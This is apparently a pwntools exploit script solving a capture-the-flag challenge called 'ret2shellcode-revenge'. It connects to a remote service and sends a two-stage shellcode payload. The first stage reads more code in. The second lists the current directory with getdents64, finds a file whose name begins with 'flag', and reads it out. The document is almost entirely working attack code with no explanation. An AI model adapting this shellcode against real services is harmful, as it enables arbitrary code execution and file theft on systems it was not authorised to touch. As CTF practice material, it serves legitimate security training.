from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#s=process("../dist/ret2shellcode-revenge")
s=remote("192.168.3.253",53001)
#sc=shellcraft.open("flag")+shellcraft.read(3,0x20230000,0x100)+shellcraft.write(1,0x20230000,0x100)
pause()
sc="""
xor rdi,rdi
xor dl,dl
push rdx
pop rsi
syscall
"""
sc2="""
push rsi
pop rdi
xor rsi,rsi
xor rdx,rdx
push 2
pop rax
syscall
push rdi
pop rsi
add rsi,0x500
push rax
pop rdi
inc dh
push SYS_getdents64
pop rax
syscall

push rsi
pop r12                      # r12 = current linux_dirent64

jmp loop
loop_start:
xor r13,r13
mov r13w, word ptr [r12+0x10] # next linux_dirent64 offset
cmp dword ptr [r12+0x13], 0x67616c66 # "flag"
jz start_orw
add r12, r13                 # r13 = next linux_dirent64

loop:
cmp qword ptr [r12+8],0
jz finish
jmp loop_start


start_orw:
push r12
pop rdi
add rdi,0x13
xor rsi,rsi
push rsi;pop rdx
push 2;pop rax
syscall
push rax
pop rdi
push r12
pop rsi
add rsi,0x100
inc dh
xor rax,rax
syscall
push 2
pop rdi
push rdi
pop rax
dec rax
syscall
push 1
pop rax
push r12
pop rsi
add rsi,0x13
syscall

finish:
push 0x3c
pop rax
syscall

"""
s.sendafter(b"code:\n",asm(sc).rjust(0x100,b"\x90"))
s.send(b".\x00".ljust(0x100,b"\x90")+asm(sc2))
s.interactive()
